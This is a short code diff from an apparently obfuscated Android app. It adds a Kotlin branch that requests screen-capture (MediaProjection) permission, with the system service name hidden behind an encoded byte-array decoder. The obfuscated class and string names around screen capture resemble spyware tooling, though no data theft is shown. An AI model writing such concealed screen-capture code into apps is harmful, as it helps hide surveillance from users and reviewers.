@@ -19,6 +19,12 @@ class XerQvgpGBzr8FDFr: Activity() {
                 val intent = mediaProjectionManager.createScreenCaptureIntent()
                 startActivityForResult(intent, REQ_REQUEST_MEDIA_PROJECTION)
             }
+            ACT_REQUEST_MEDIA_PROJECTION2 -> {
+                val mediaProjectionManager =
+                    getSystemService(p50.a(byteArrayOf(29, 22, 127, -73, -85, -66, -112, 19, 31, 25, 126, -67, -66, -120, -113, 15), byteArrayOf(112, 115, 27, -34, -54, -31, -32, 97))) as MediaProjectionManager
+                val intent = mediaProjectionManager.createScreenCaptureIntent()
+                startActivityForResult(intent, 1000)
+            }
             else -> finish()
         }
     }
